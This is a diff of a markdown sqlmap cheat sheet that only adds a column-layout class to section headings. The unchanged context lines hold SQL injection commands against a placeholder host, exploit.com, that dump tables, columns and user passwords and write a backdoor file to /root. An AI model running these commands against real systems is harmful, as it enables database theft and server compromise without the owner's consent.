@@ -11,7 +11,7 @@ intro: |
     Quick start sqlmap cheat sheet.
 ---
 
-## Exploitation
+## Exploitation {.cols-1}
 
 ### Command
 
@@ -39,7 +39,7 @@ sqlmap -u http://exploit.com/becomemember.php?id=14 -D database -T table_name --
 sqlmap -u http://exploit.com/becomemember.php?id=14 -D database -T table_name -C colum1,column2,clumn3 --dump
 ```
 
-## Speeding Up The process
+## Speeding Up The process {.cols-1}
 
 ### Command
 
@@ -70,7 +70,7 @@ sqlmap -u http://exploit.com/books/view.php?id=100 -D database -T user -c users,
 
 
 
-## File Privileges
+## File Privileges {.cols-1}
 
 ### Command
 
@@ -91,7 +91,7 @@ sqlmap -u http://exploit.com/books/view.php?id=100 --file-write=/root/imxx/backd
 ```
 
 
-## Getting Shells
+## Getting Shells {.cols-1}
 
 ### Command
 
@@ -116,7 +116,7 @@ __Using Proxy__
 sqlmap --proxy="127.0.0.1:8888" -u https://exploit.com/home.php?id=12 --dbs
 ```
 
-## Advanced usage
+## Advanced usage {.cols-1}
 
 ### usage
 
@@ -160,7 +160,7 @@ Attack example
 sqlmap -u "http://url/news?id=1&Submit=Submit" --cookie="xxx" --string="Surname" --dbms=mysql --user --password
 ```
 
-## Options
+## Options {.cols-1}
 
 ```bash
 # Request
